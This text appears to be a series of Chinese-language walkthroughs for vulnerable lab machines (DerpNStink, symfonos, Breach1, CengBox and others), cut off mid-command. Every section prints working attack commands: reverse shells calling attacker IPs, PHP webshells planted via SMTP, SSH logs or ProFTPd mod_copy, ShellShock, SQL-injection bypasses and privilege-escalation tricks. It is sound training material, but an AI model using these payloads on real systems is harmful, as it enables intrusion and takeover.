$argon2id$v=19$m=65536,t=16,p=2$MTIzNDU2Nzg$zsu3+i7HptpLzboB2NgkoqXdFnY1sfu2muwr4LFIbGo 替换Hash值之后登入Typo3后台，CMS设定中不允许上传php文件 Module Menu -&gt; ADMIN TOOLS -&gt; Settings -&gt; Configure Installation-Wide Options -&gt; Backend[BE] -&gt; [BE][fileDenyPattern] 清除内容即可解除对于文件上传的限制 使用weevely生成WebShell weevely generate pass wee.php 上传WebShell 访问Shell 连接Shell weevely http://192.168.31.26/fileadmin/wee.php pass 权限提升 使用python反弹Shell 1python3 -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;192.168.31.10&#39;,8081));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);&quot; 获取pty 查看具有SUID权限的文件 这里的/usr/local/bin路劲下的文件明显是不对劲的 apache2-restart为ELF文件 使用strings命令查看文件字符 使用的是service命令 进行PATH提权 参考资料 WalkThrough DerpNStink 2020/06/22 14:53:48 寻找靶机IP nmap -sn -T5 192.168.31.0/24 | grep -B2 VMware 端口扫描 nmap -p 1-65535 -sV -A -T5 -n -v 192.168.31.61 Web路径扫描 dirb http://192.168.31.61/ -w 漏洞利用 目录/weblog/设置了302跳转并指向了一个域名，需要修改hosts文件 使用Wordpress框架，可以使用wpscan进行扫描 wpscan --url http://derpnstink.local/weblog/ -e u wpscan --url http://derpnstink.local/weblog/ -e ap 查找插件相关信息 searchsploit slideshow gallery 1.4.6 拷贝文件 searchsploit -m 34681 需要Wordpress的账户 尝试弱口令得到账户admin:admin 生成php后门 weevely generate pass wee.php 使用脚本上传后门 python 34681.txt -t http://derpnstink.local/weblog/ -u admin -p admin -f wee.php 连接后门 weevely http://derpnstink.local/weblog//wp-content/uploads/slideshow-gallery/wee.php pass python反弹Shell 123nc -lvnp 8081-----python -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;192.168.31.10&#39;,8081));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);&quot; 权限提升 获取pty 查看Wordpress配置信息 cat /var/www/html/weblog/wp-config.php 得到unclestinky的密码Hash 使用john破解Hash john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt hash 得到密码 stinky:wedgie57 尝试切换账户，成功 找到mrderp与stinky的对话 尝试寻找流量包 开启http服务，下载至本地 使用wireshark分析流量 mrderp:derpderpderpderpderpderpderp 切换至用户mrderp 查看文件 cat /home/mrderp/Desktop/helpdesk.log 访问链接 查看sudo权限 可以进行sudo提权 上传python反弹Shell脚本 提权为root 密码共用 太常规了 symfonos 1 2020/06/27 00:25:29 寻找靶机IP nmap -sn -T5 192.168.88.0/24 | grep -B2 VMware 端口扫描 nmap -p 1-65535 -sV -A -T5 -v -n 192.168.88.130 Web路径扫描 dirb http://192.168.88.130/ -w 漏洞利用 收集smb信息 enum4linux 192.168.88.130 目录/anonymous可以匿名访问 使用空账户即可登入 下载并查看attention.txt 文本中提到三个弱口令，可以使用这三个弱口令来尝试登入helios账户的个人目录 smbclint //192.168.88.130/helios -U helios 使用口令 qwerty 即可登入 查看文本todo.txt 得到信息/h3l105 Web主页如图 而且扫描Web目录时并未获取到有效信息 猜测/h3l105为Web目录 访问目录/h3l105，为Wordpress站点 使用wpscan进行扫描 wpscan --url http://192.168.88.130/h3l105/ -e ap --plugins-detection Aggressive 查询相关漏洞 使用Telnet连接SMTP服务来写入Webshell 1234567telnet 192.168.88.130 25MAIL FROM: &lt;Hacker&gt;RCPT TO: heliosdata&lt;?php system($_GET[&#39;pass&#39;]); ?&gt;.quit 使用LFI来实现GetShell http://192.168.88.130/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/helios&amp;pass=nc -e /bin/bash 192.168.88.129 8081 权限提升 查看具有SUID的程序 find / -user root -perm -4000 -print 2&gt; /dev/null 可以进行PATH提权 SMTP+LFI=GetShell 通过SMTP写入WebShel的内容（需要已知一个系统的用户名） 再利用LFI来执行WebShell（Web包含可以访问/var/mail） 参考资料 WalkThrough symfonos 3 2020/07/05 15:27:23 寻找靶机IP nmap -sn -T5 192.168.88.0/24 | grep -B2 VMware 端口扫描 nmap -p 1-65535 -sV -A -T5 -v -n 192.168.88.130 Web路径扫描 dirb http://192.168.88.130/ -w 漏洞利用 访问页面，在源代码出得到信息 尝试后发现存在路径/cgi-bin/underworld 使用ShellShock漏洞反弹Shell curl -H &quot;user-agent: () &#123; :; &#125;; echo; echo; /bin/bash -c 'cat /etc/passwd'&quot; http//192.168.88.130/cgi-bin/underworld 权限提升 获取pty 查找属于用户组hades的文件 查看statuscheck.txt 应该是curl请求的结果 下载pspy 运行pspy之后得到信息 python2脚本ftpclient.py为计划任务 靶机上存在tcpdump 使用tcpdump监听流量 timeout 120 tcpdump -v -i lo port 21 得到账户hades:PTpZTfU4vxgzvRBE 使用ssh登入靶机后查看脚本文件 文件不可写，且目录无法操作 查看库文件ftplib 库文件可写 修改库文件中的ftp.quit()函数 插入反弹Shell命令 提权成功 ShellShock apache /cgi-bin/* (200) 参考资料 WalkThrough symfonos 4 2020/07/20 11:00:24 寻找靶机IP nmap -sn -T5 192.168.31.0/24 | grep -B2 virtual 端口扫描 nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.145 Web路径扫描 gobuster dir -u 192.168.31.145 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php 漏洞利用 访问/atlantis.php 使用SQL注入Bypass登入 12username&#x3D;&#39; or 1#password&#x3D;1 登入后跳转至/sea.php 选择Hades之后出现文字内容 也出现了Get参数file 访问/gods 可能存在本地文件包含漏洞，且文件名后面会补上.log 尝试包含登入日志 /sea.php?file=../../../../var/log/auth 存在本地文件包含漏洞 ssh登入构造Webshell ssh '&lt;?php system($_GET['pass']); ?&gt;'@192.168.31.145 反弹Shell 12nc -lvnp 9901&#x2F;sea.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;auth&amp;pass&#x3D;nc -e &#x2F;bin&#x2F;bash 192.168.31.10 9901 权限提升 获取tty python -c 'import pty;pty.spawm(&quot;/bin/bash&quot;)' 查看本地服务 ss -antlp ps -auxwww | grep 127.0.01 端口转发 socat tcp-listen:1234,fork tcp-connect:localhost:8080 访问http://192.168.31.145:1234/ 查看cookie Base64解码 可能存在pickle反序列化漏洞，构造反弹Shell的Payload 发送Payload 提权成功 jsonpickle反序列化 在进行反序列化的时候会执行函数reduce类似于php反序列化中的wakeup() 参考资料 WalkThrough WalkThrough pickel NullByte 2020/07/31 10:52:00 寻找靶机IP nmap -sn -T5 192.168.31.0/24 | grep -B2 virtual 端口扫描 nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.234 Web路径扫描 dirb http://192.168.31.234/ -w 漏洞利用 访问Web页面 下载图片并分析 12curl -O http:&#x2F;&#x2F;192.168.31.234&#x2F;main.gifexiftool main.gif 访问目录/kzMb5nVYJw 查看源代码 使用Burpsuite对POST参数key进行爆破 字典文件为/usr/share/wordlists/dirb/big.txt 输入key之后页面变化 提交usrtosearch参数进行查询 直接访问420search.php 猜测该php文件可以对数据库进行查询，可能存在SQL注入 提交参数usrtosearch=admin&quot; or 1=1%23 确认存在SQL注入 使用SQLMap sqlmap -u http://192.168.31.234/kzMb5nVYJw/420search.php?usrtosearch=admin --dbs --batch sqlmap -u http://192.168.31.234/kzMb5nVYJw/420search.php?usrtosearch=admin -D seth --tables --batch sqlmap -u http://192.168.31.234/kzMb5nVYJw/420search.php?usrtosearch=admin -D seth -T users --columns --batch sqlmap -u http://192.168.31.234/kzMb5nVYJw/420search.php?usrtosearch=admin -D seth -T users -C id,position,user,pass --dump --batch Base64解码 Hash破解 使用该账户登入SSH 权限提升 查看文件~/.bash_history 存在文件/var/www/backup/procwatch 文件执行ps命令，且具有SUID权限 进行PATH提权 参考资料 WalkThrough Breach1 2020/09/06 11:35:19 寻找靶机IP nmap -sn -T5 192.168.110.0/24 | grep -B3 virtual 端口扫描 nmap --top-port 200 -sV -T5 -v -n 192.168.110.140 目标靶机存在IDS/IPS Web路径扫描 gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://192.168.110.140/ 漏洞利用 使用浏览器访问Web页面 查看源代码 两次Base64解码后得到 pgibbons:damnitfeel$goodtobeagang$ta 图片导向其他页面 点击Employee portal 使用账户登入 12username: pgibbonspassword: damnitfeel$goodtobeagang$ta 在第三封邮件中获得有效信息 keystore文件 192.168.110.140/.keystore 查看Contributions 可以进一步获得信息 这里可以再获取一个流量包文件 http://192.168.110.140/impresscms/_SSL_test_phase1.pcap 并且得知密码为tomcat 查看keystore所存储的私钥 12keytool -list -keystore keystoretomcat 导出p12证书 keytool -importkeystore -srckeystore keystore -destkeystore keystore.p12 -deststoretype pkcs12 使用Wireshark分析流量包 目标靶机的8443端口可能存在加密Web服务 导入证书文件 Edit -&gt; Preferences -&gt; Protocols -&gt; TLS -&gt; Edit... 导入之后即可解密TLS流量 对于Basic认证内容进行Base64解码 12echo &#39;dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC&#39; | base64 -dtomcat:Tt\\5D8F(#!*u&#x3D;G)4m7zB 访问https://192.168.110.140:8443/_M@nag3Me/html 认证错误，使用Burpsuite代理 使用账户登入 12username: tomcatpassword: Tt\\5D8F(#!*u&#x3D;G)4m7zB 构造恶意war包 123msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;192.168.110.3 LPORT&#x3D;9902 -f raw &gt; msf.jspzip msf.zip msf.jspmv msf.zip msf.war 上传war包 在MSFConsole中进行配置 12345use exploit&#x2F;multi&#x2F;handlerset payload java&#x2F;jsp_shell_reverse_tcpset LHOST 192.168.110.3set LPORT 9902run 访问URLhttps://192.168.110.140:8443/msf/msf.jsp MSFConsole中接收到Shell 权限提升 mysql空口令登入 12mysql -u rootselect user,password from mysql.user; 破解MD5值 thelaststraw 切换账户至milton 12su miltonthelaststraw 下载图片，查看EXIF 12wget http:&#x2F;&#x2F;192.168.110.140&#x2F;images&#x2F;bill.pngexiftool bill.png 得到密码 coffeestains 切换账户 12su blumberghcoffeestains 开启本地HTTP服务 python -m SimpleHTTPServer 9900&amp; 靶机下载pspy wget http://192.168.110.3:9900/pspy64 使用pspy 12chmod +x pspy64.&#x2F;pspy64 | grep UID&#x3D;0 &amp; 可以看到root执行的命令/bin/sh -c /usr/share/cleanup/tidyup.sh 查看sudo权限，可以使用tee写反弹shell命令至tidy.sh root执行反弹shell命令之后即可获得root权限 echo 'nc -e /bin/bash 192.168.110.3 9903' | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh nc -lvnp 9903 keystore 可以使用keytool查看并导出keystore中所存储的密钥文件 参考资料 WalkThrough Infosec_Warrior02 2020/09/09 12:46:57 寻找靶机IP nmap -sn -T5 192.168.1.0/24 | grep -B3 virtual 端口扫描 nmap -p 1-65535 -sV -T5 -v -n 192.168.1.109 漏洞利用 使用nc连接目标56563端口 尝试输入非预期输入 得到报错信息 可以利用input()函数进行RCE payload: __import__(&quot;os&quot;).system(&quot;/bin/bash&quot;) 获取Shell 权限提升 SSH登入时得到信息 查看发型版的代号 cat /etc/*release 查看主机名与用户名 构造账户 hydra -I -L user -P pass -e n ssh://192.168.1.109 得到账户 ck04:bionic SSH登入 12ssh ck04@192.168.1.109 -p bionicbionic 输入命令之后ssh断开连接 查看ck04用户的默认Shell 构造反弹shell脚本并执行 获取tty 查看ck04用户的sudo权限并利用 查看bla用户的sudo权限 使用unzip命令覆盖passwd文件 12345openssl passwd -6 hackforfun $6$qKge9GxrDANmLdaL$KZsmUQjuwSCG5TOZoBJW80ECpul61n9RbTRe03iL2qbdodW2bS1u2kpCHnpF.wEF4nulOxUxmkhRo&#x2F;OpUmyxe1echo &#39;test:$6$qKge9GxrDANmLdaL$KZsmUQjuwSCG5TOZoBJW80ECpul61n9RbTRe03iL2qbdodW2bS1u2kpCHnpF.wEF4nulOxUxmkhRo&#x2F;OpUmyxe1:0:0::&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt; passwdzip new.zip passwdsudo -u root &#x2F;usr&#x2F;bin&#x2F;unzip new.zip -d &#x2F;etc python2 input() python2的函数input()会执行输入的数据，插入python命令即可Getshell或反弹Shell，而使用函数raw_input()则不会执行命令 参考资料 WalkThrough Infosec_Warrior03 2020/09/21 19:24:32 寻找靶机IP nmap -sn -T5 192.168.110.0/24 | grep -B2 virtual 端口扫描 nmap -p- -A -T5 -v -n 192.168.110.6 Web路径扫描 dirb http://192.168.110.6/ 漏洞利用 访问http://192.168.110.6/phpMyAdmin/ 使用弱口令登入 12username:rootpassword:root 查询mysql.user中的账户信息 得到两个账户 12root:81F5E21E35407D884A6CD4A731AEBFB6AF209E1Bkrishna:4DC8EC6204F12795FE54CC79FFA2A8579A947D04 进行md5查询之后得到明文口令 12root:rootkrishna:infosec 尝试使用krishna:infosec登入SSH服务 权限提升 查看sudo权限 使用gcc进行提权 查看sudo权限 使用gcc进行提权 Shell脚本提权与空格 使用shell脚本进行sudo/suid提权时，参数中带有空格则需要使用引号 参考资料 WalkThrough CengBox 2020/10/25 16:31:59 寻找靶机IP nmap -sn -T5 192.168.1.0/24 | grep -B2 virtual 端口扫描 nmap -p 1-65535 -A -T5 192.168.1.104 Web路径扫描 gobuster dir -u http://192.168.1.104 -w /usr/share/wordlists/dirb/big.txt 漏洞利用 访问 http://192.168.1.104/masteradmin/login.php 尝试SQL注入绕过 12username&#x3D;1&#39; or 1#passwrod&#x3D;1 绕过登录，跳转至 http://192.168.1.104/masteradmin/upload.php 尝试上传shell.php，返回错误信息 更改文件名为shell.php.ceng，上传成功 WebShell的内容为 &lt;?php @system($_GET[&quot;cmd&quot;]);?&gt; WebShell存放路径为 /uploads/shell.php.ceng 存在python3环境 使用WebShell进行反弹Shell 12nc -lvnp 9908curl http:&#x2F;&#x2F;192.168.1.104&#x2F;uploads&#x2F;shell.php.ceng?cmd&#x3D;python3%20-c%20%22import%20os%2Csocket%2Csubprocess%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%27192.168.1.109%27%2C9908%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%27&#x2F;bin&#x2F;bash%27%2C%27-i%27%5D%29%3B%22 权限提升 获取tty, 查看系统信息 123python3 -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;uname -acat &#x2F;etc&#x2F;*release 查看数据库信息 cat /var/www/html/masteradmin/db.php 得到数据库账户信息 root:SuperS3cR3TPassw0rd1! 进入数据库查看Web账户信息 mysql -u root -pSuperS3cR3TPassw0rd1! -e 'select * from cengbox.admin;' 得到Web账户信息 masteradmin:C3ng0v3R00T1! 查看账户信息 cat /etc/passwd 尝试登入cengover账户 12ssh cengover@192.168.1.104C3ng0v3R00T1! 在pspy目录开启HTTP服务 1python2 -m SimpleHTTPServer 9900&amp; 下载并使用pspy 1234cd &#x2F;tmpcurl -O http:&#x2F;&#x2F;192.168.1.109:9900&#x2F;pspy64chmod +x pspy64.&#x2F;pspy64&amp; 存在root的计划任务 查看脚本文件 拥有写入权限 可以写入反弹Shell命令 监听端口 1nc -lvnp 8087 获取root权限 参考资料 WalkThrough TenderFoot-1 2020/10/28 21:29:04 寻找靶机IP nmap -sn -T5 192.168.1.0/24 | grep -B2 virtual 端口扫描 nmap -p 1-65535 -sV -T5 -v -n 192.168.1.108 Web路径扫描 dirb http://192.168.1.108/ -w 漏洞利用 访问 http://192.168.1.108/ 提示需要进行路径枚举 查看源代码得到提示 /robots.txt /robots.txt 提示路径 /hint 访问/hint 存在HTML注释中存在Base32编码 解码结果为 12345 ____________________| N0thing Here! || Try something else!| --------------------Enumerate more :)� 继续枚举路径 1gobuster dir -u http:&#x2F;&#x2F;192.168.1.108&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-1.0.txt 访问 /fotocd HTML注释中存在BrainFuck编码 解码结果为 123456789101112&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;JDk5OTkwJA&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Did you found username ?if yes: Then you have cred. of one user, enter into user account by ssh port. syntax:&#123;ssh username@IP&#125;if not: Then enumerate more :) G00D LUCK ! 12echo -n &#39;JDk5OTkwJA&#x3D;&#x3D;&#39; | base64 -d$99990$ 继续枚举其他类型WEB文件 1gobuster dir -u http:&#x2F;&#x2F;192.168.1.108&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-1.0.txt -x .html,.php,.css,.js 访问 /entry.js 内容为 monica 登入SSH服务 12ssh monica@192.168.1.108$99990$ 权限提升 得到提示信息 访问 /fotocd/0x0343548764 下载并解压ZIP文件 123curl http:&#x2F;&#x2F;192.168.1.108&#x2F;fotocd&#x2F;0x0343548764&#x2F;joey.zipunzip joey.zip#9175 得到两个文件: gift.zip, note.txt note.txt的内容为 123456789&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Not this time DUDE!Just G00GLE and learn how to crack zip passwords :)you will learn new thing!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 破解gift.zip 1fcrackzip gift.zip -D -p &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -u 得到密码为 h4ck3d 解压后得到 gift.txt，内容为 123456789101112131415&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Hahaha! there is no gift !Your Bad Luck!But what happened if you don&#39;t get gift.Take a hint from my side, which may help you to solve this box further.I make a binary to get another user&#39;s shell,Just google, command for search&#x2F;find SUID or binaries and figure it out how to execute this binary.G00D LUCK! :)&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 搜索SUID文件 1find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null 找到文件 /opt/exec/chandler 执行后用户身份变为 chandler 查看提示信息 Base32解码的结果为 1passwd:Y0uCr4ckM3 SSH登入chandler账户 12ssh chandler@192.168.1.108Y0uCr4ckM3 查看sudo权限 1sudo -l 进行sudo提权 12sudo -u root &#x2F;usr&#x2F;bin&#x2F;ftp!&#x2F;bin&#x2F;bash SUDO &amp; GID 使用脚本切换用户身份时，只是简单地更换了UID与GID，并没有添加用户所属的groups，所以不能直接进行sudo提权而是需要使用SSH登入之后再提权 参考资料 WalkThrough symfonos 2 2020/10/28 08:21:48 寻找靶机IP nmap -sn -T5 192.168.1.0/24 | grep -B2 virtual 端口扫描 nmap -p 1-65535 -sV -T5 -v -n 192.168.1.107 Web路径扫描 dirb http://192.168.1.107/ -w 漏洞利用 收集smb信息 enum4linux 192.168.1.107 目录/anonymous可以匿名访问，使用空账户即可登入 且获得用户名aeolus，cronus 下载并查看log.txt 内容为smb.conf与proftpd.conf smb的/anonymous路径对应/home/aeolus/share/ ftp存在匿名访问 尝试匿名访问FTP服务 12345ftp 192.1068.1.107anonymousanonymoussite cpfr &#x2F;var&#x2F;backups&#x2F;shadow.baksite cpto &#x2F;home&#x2F;aeolus&#x2F;share&#x2F;shadow.bak 通过smb服务获取shadow的备份文件 使用john破解Hash 得到账户信息aeolus:sergioteamo 使用账户信息登入SSH 权限提升 查看系统信息 12cat &#x2F;etc&#x2F;*releaseuname -a 查看网络端口 1ss -antlp 目标对本地开放25，3306，8080端口 使用nc探测本地8080端口 本地8080端口存在Web服务 进行端口转发 1socat tcp-listen:1235,fork tcp-connect:localhost:8080 &amp; 使用浏览器访问目标1235端口 使用aeolus账户进行登入 查询相关漏洞 1searchsploit librenms 使用MSF 123456789msfconsoleuse exploit&#x2F;linux&#x2F;http&#x2F;librenms_addhost_cmd_injectset RHOST 192.168.1.107set RPORT 1235set USERNAME aeolusset PASSWORD sergioteamoset LHOST 192.168.1.103set LPORT 9999exploit 获取tty 1python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; 查看sudo权限 1sudo -l 进行sudo提权 1sudo -u root mysql -e &#39;\\! &#x2F;bin&#x2F;bash&#39; ProFRPd 1.3.5 mod_copy 该模块允许未授权用户进行任意文件拷贝操作，配合SMB访问以及已知SMB路径即可完成任意文件下载/上传操作 该模块也存在写入Webshell的操作，具体操作如下 1234site cpfr &#x2F;proc&#x2F;self&#x2F;cmdlinesite cpto &#x2F;var&#x2F;www&#x2F;html&#x2F;&lt;?php passthru($_GET[&#39;cmd&#39;]);?&gt;.phpsite cpfr &#x2F;var&#x2F;www&#x2F;html&#x2F;&lt;?php passthru($_GET[&#39;cmd&#39;]);?&gt;.phpsite cpto &#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php 参考资料 WalkThrough 写入WebShell FishyMail 2020/11/04 20:52:24 寻找靶机IP nmap -sn -T5 192.168.1.0/24 | grep -B2 virtual 端口扫描 nmap -p 1-65535 -sV -A -T5 -v -n Web路径扫描 dirb http://192.168.1.103/ -w 漏洞利用 访问 http://192.168.1.103:8080/robots.txt 12345User-agent: *Disallow:&#x2F;spongebob&#x2F;dataentry&#x2F;fishymailer 继续枚举目录 /dataentry/ 下的路劲 枚举目录 /dataentry/backup/admin/files/ 下的文件 访问 http://192.168.1.103:8080/dataentry/backup/admin/files/dir.txt 对内容进行解码 构造字典进行SSH爆破 123456789101112131415cat words1spongebobSandysquidward0ctopuspatrickchocolateflavoredWATERdirtysalmon chinookadminrootusertestpearlkrabs 1hydra -I -L words1 -P words1 ssh:&#x2F;&#x2F;192.168.1.103:2600 使用 squidward 账户登入SSH服务 12ssh squidward@192.168.1.103 -p 26000ctopus 权限提升 查看信息 cat /BikiniBottom-db.sql 进行Base64解码 在线MD5解密 12345spongebob:sandysquidward:0ctopuspatrick:dirtysalmon:crabby4evaSandy:astronaut 构造字典进行SSH爆破 12345678910cat 